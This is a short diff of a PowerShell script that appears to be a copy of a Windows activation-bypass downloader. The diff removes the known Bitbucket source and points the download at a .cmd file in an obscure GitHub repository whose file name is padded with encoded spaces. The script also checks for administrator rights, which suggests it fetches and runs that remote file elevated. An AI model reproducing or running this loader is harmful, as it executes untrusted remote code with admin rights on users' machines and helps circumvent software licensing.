@@ -3,8 +3,8 @@ $ErrorActionPreference = "Stop"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://raw.githubusercontent.com/maxorion411/kitrepositoryrepositoryrepository/main/8B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F7648B16F764.cmd'
-$DownloadURL2 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/master/MAS/All-In-One-Version/MAS_AIO-CRC32_63055B8E.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/maxorion411/kitrepositoryrepositoryrepository/refs/heads/main/oh1%20%20%20%20.cmd'
+
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
